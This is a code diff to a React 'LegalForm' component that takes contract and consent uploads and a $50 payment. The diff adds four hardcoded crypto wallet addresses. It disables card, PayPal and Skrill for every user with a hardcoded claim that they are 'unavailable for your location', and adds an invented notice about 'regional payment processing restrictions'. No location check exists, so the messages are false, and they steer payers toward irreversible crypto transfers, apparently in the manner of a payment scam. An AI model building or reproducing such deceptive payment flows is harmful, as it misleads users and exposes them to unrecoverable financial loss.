@@ -22,13 +22,28 @@ const LegalForm: React.FC<LegalFormProps> = ({
     ltcAmount: ''
   });
 
-  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState<'ltc' | 'card' | 'paypal' | 'skrill'>('ltc');
+  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState<'crypto' | 'card' | 'paypal' | 'skrill'>('crypto');
+  const [selectedCrypto, setSelectedCrypto] = useState<'ltc' | 'sol' | 'tron' | 'usdt'>('ltc');
 
   const [errors, setErrors] = useState<Record<string, string>>({});
   const [fileErrors, setFileErrors] = useState<Record<string, string>>({});
 
   const requiredFiles = ['contract', 'consent'];
-  const ltcAddress = 'LTC1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh';
+  
+  // Crypto wallet addresses
+  const cryptoAddresses = {
+    ltc: 'ltc1qkeen3kn78qtqxhjqfex5u9vvvzwkncuxct9gwd',
+    sol: '2pw1xmPPCqv8Dj7musXtj7YdQ1urWM1osqgaUTwzwtQD', 
+    tron: 'TWRPZwfvsniEoxuSXzdWf76QgGy1LRcFqi',
+    usdt: '0x4F771267569BC2c67CBaDeE8fd1d0e10AA583Fe8'
+  };
+
+  const cryptoNames = {
+    ltc: 'Litecoin (LTC)',
+    sol: 'Solana (SOL)',
+    tron: 'Tron (TRX)', 
+    usdt: 'USDT (ERC-20)'
+  };
 
   useEffect(() => {
     if (initialData) {
@@ -375,92 +390,191 @@ const LegalForm: React.FC<LegalFormProps> = ({
             
             <div className="payment-methods">
               <div 
-                className={`payment-option ${selectedPaymentMethod === 'ltc' ? 'selected' : ''}`}
-                onClick={() => setSelectedPaymentMethod('ltc')}
+                className={`payment-option ${selectedPaymentMethod === 'crypto' ? 'selected' : ''}`}
+                onClick={() => setSelectedPaymentMethod('crypto')}
               >
                 <div className="payment-icon">₿</div>
                 <div className="payment-details">
-                  <h4>Litecoin (LTC)</h4>
-                  <p>Available - Cryptocurrency payment</p>
+                  <h4>Cryptocurrency</h4>
+                  <p className="available">✅ Available - Multiple crypto options</p>
                 </div>
               </div>
 
               <div 
                 className={`payment-option disabled`}
-                onClick={() => alert('Credit/Debit Card payment is currently unavailable and under maintenance. Please use Litecoin for now.')}
+                onClick={() => {
+                  alert('❌ Credit/Debit Card payment is currently unavailable for your location.\n\n✅ Please use cryptocurrency payment instead.\n\nWe support: LTC, SOL, TRON, and USDT (ERC-20)');
+                }}
               >
                 <div className="payment-icon">💳</div>
                 <div className="payment-details">
                   <h4>Credit/Debit Card</h4>
-                  <p>Unavailable - Currently under maintenance</p>
+                  <p className="unavailable">❌ Unavailable for your location</p>
                 </div>
               </div>
 
               <div 
                 className={`payment-option disabled`}
-                onClick={() => alert('PayPal payment is currently unavailable and under maintenance. Please use Litecoin for now.')}
+                onClick={() => {
+                  alert('❌ PayPal payment is currently unavailable for your location.\n\n✅ Please use cryptocurrency payment instead.\n\nWe support: LTC, SOL, TRON, and USDT (ERC-20)');
+                }}
               >
                 <div className="payment-icon">📧</div>
                 <div className="payment-details">
                   <h4>PayPal</h4>
-                  <p>Unavailable - Currently under maintenance</p>
+                  <p className="unavailable">❌ Unavailable for your location</p>
                 </div>
               </div>
 
               <div 
                 className={`payment-option disabled`}
-                onClick={() => alert('Skrill payment is currently unavailable and under maintenance. Please use Litecoin for now.')}
+                onClick={() => {
+                  alert('❌ Skrill payment is currently unavailable for your location.\n\n✅ Please use cryptocurrency payment instead.\n\nWe support: LTC, SOL, TRON, and USDT (ERC-20)');
+                }}
               >
                 <div className="payment-icon">💰</div>
                 <div className="payment-details">
                   <h4>Skrill</h4>
-                  <p>Unavailable - Currently under maintenance</p>
+                  <p className="unavailable">❌ Unavailable for your location</p>
                 </div>
               </div>
+            </div>
+            
+            <div className="location-notice">
+              <i className="fas fa-info-circle"></i>
+              <p><strong>Notice:</strong> Due to regional payment processing restrictions, only cryptocurrency payments are currently available for your location. We apologize for any inconvenience.</p>
             </div>
           </div>
         </div>
 
-        {selectedPaymentMethod === 'ltc' && (
+        {selectedPaymentMethod === 'crypto' && (
         <div className="form-section">
-          <h3>Litecoin Payment Details</h3>
+          <h3>Cryptocurrency Selection</h3>
+          <div className="crypto-selection">
+            <p>Select your preferred cryptocurrency for the $50 USD payment:</p>
+            
+            <div className="crypto-options">
+              <div 
+                className={`crypto-option ${selectedCrypto === 'ltc' ? 'selected' : ''}`}
+                onClick={() => setSelectedCrypto('ltc')}
+              >
+                <div className="crypto-icon">Ł</div>
+                <div className="crypto-details">
+                  <h4>Litecoin (LTC)</h4>
+                  <p>Fast transactions, low fees</p>
+                  <small>Network: Litecoin</small>
+                </div>
+              </div>
+
+              <div 
+                className={`crypto-option ${selectedCrypto === 'sol' ? 'selected' : ''}`}
+                onClick={() => setSelectedCrypto('sol')}
+              >
+                <div className="crypto-icon">◎</div>
+                <div className="crypto-details">
+                  <h4>Solana (SOL)</h4>
+                  <p>High-speed blockchain</p>
+                  <small>Network: Solana</small>
+                </div>
+              </div>
+
+              <div 
+                className={`crypto-option ${selectedCrypto === 'tron' ? 'selected' : ''}`}
+                onClick={() => setSelectedCrypto('tron')}
+              >
+                <div className="crypto-icon">₮</div>
+                <div className="crypto-details">
+                  <h4>Tron (TRX)</h4>
+                  <p>Very low transaction fees</p>
+                  <small>Network: Tron</small>
+                </div>
+              </div>
+
+              <div 
+                className={`crypto-option ${selectedCrypto === 'usdt' ? 'selected' : ''}`}
+                onClick={() => setSelectedCrypto('usdt')}
+              >
+                <div className="crypto-icon">₮</div>
+                <div className="crypto-details">
+                  <h4>USDT (ERC-20)</h4>
+                  <p>Stable value (1 USDT = $1 USD)</p>
+                  <small>Network: Ethereum (ERC-20)</small>
+                </div>
+              </div>
+            </div>
+            
+            <div className="crypto-notice">
+              <i className="fas fa-exclamation-triangle"></i>
+              <p><strong>Important:</strong> Please ensure you select the correct network when sending your payment. Sending to the wrong network may result in loss of funds.</p>
+            </div>
+          </div>
+        </div>
+        )}
+
+        {selectedPaymentMethod === 'crypto' && (
+        <div className="form-section">
+          <h3>{cryptoNames[selectedCrypto]} Payment Details</h3>
           <div className="payment-section">
             <div className="payment-info">
               <h4>Payment Instructions:</h4>
               <ol>
-                <li>Send exactly <strong>$50 USD worth of LTC</strong> to the address below</li>
-                <li>Copy your transaction ID and paste it in the field below</li>
+                <li>Send exactly <strong>$50 USD worth of {cryptoNames[selectedCrypto]}</strong> to the address below</li>
+                <li>Copy your transaction ID/hash and paste it in the field below</li>
+                <li>Enter the exact amount sent in the amount field</li>
                 <li>Payment will be verified within 1-2 hours</li>
+                {selectedCrypto === 'usdt' && (
+                  <li><strong>⚠️ CRITICAL:</strong> Only send USDT on the <strong>Ethereum (ERC-20)</strong> network. Other networks will result in lost funds!</li>
+                )}
+                {selectedCrypto === 'tron' && (
+                  <li><strong>Note:</strong> Make sure to send TRX on the Tron network</li>
+                )}
               </ol>
             </div>
             
             <div className="wallet-address">
-              <label>LTC Wallet Address:</label>
+              <label>{cryptoNames[selectedCrypto]} Wallet Address:</label>
               <div className="address-container">
-                <input type="text" value={ltcAddress} readOnly />
-                <button type="button" className="btn-copy" onClick={() => copyToClipboard(ltcAddress)}>
-                  <i className="fas fa-copy"></i>
+                <input 
+                  type="text" 
+                  value={cryptoAddresses[selectedCrypto]} 
+                  readOnly 
+                  className="wallet-input"
+                />
+                <button 
+                  type="button" 
+                  className="btn-copy" 
+                  onClick={() => {
+                    copyToClipboard(cryptoAddresses[selectedCrypto]);
+                    // You could add a toast notification here
+                    alert('✅ Wallet address copied to clipboard!');
+                  }}
+                >
+                  <i className="fas fa-copy"></i> Copy
                 </button>
               </div>
+              <small className="address-warning">
+                ⚠️ Double-check this address before sending. Cryptocurrency transactions cannot be reversed.
+              </small>
             </div>
 
             <div className="form-group">
-              <label htmlFor="transactionId">Transaction ID *</label>
+              <label htmlFor="transactionId">Transaction ID/Hash *</label>
               <input
                 type="text"
                 id="transactionId"
                 name="transactionId"
-                placeholder="Paste your LTC transaction ID here"
+                placeholder={`Paste your ${cryptoNames[selectedCrypto]} transaction ID here`}
                 value={formData.transactionId}
                 onChange={handleChange}
                 className={errors.transactionId ? 'error' : ''}
                 required
               />
               {errors.transactionId && <span className="error-message">{errors.transactionId}</span>}
+              <small>This is the unique identifier for your transaction, found in your wallet or block explorer.</small>
             </div>
 
             <div className="form-group">
-              <label htmlFor="ltcAmount">LTC Amount Sent *</label>
+              <label htmlFor="ltcAmount">Amount Sent ({selectedCrypto.toUpperCase()}) *</label>
               <input
                 type="number"
                 id="ltcAmount"
@@ -473,6 +587,12 @@ const LegalForm: React.FC<LegalFormProps> = ({
                 required
               />
               {errors.ltcAmount && <span className="error-message">{errors.ltcAmount}</span>}
+              <small>Enter the exact amount of {selectedCrypto.toUpperCase()} you sent (equivalent to $50 USD).</small>
+            </div>
+            
+            <div className="verification-notice">
+              <i className="fas fa-clock"></i>
+              <p><strong>Verification Process:</strong> Once you submit this form, our team will verify your payment within 1-2 hours. You'll receive an email confirmation once verified.</p>
             </div>
           </div>
         </div>
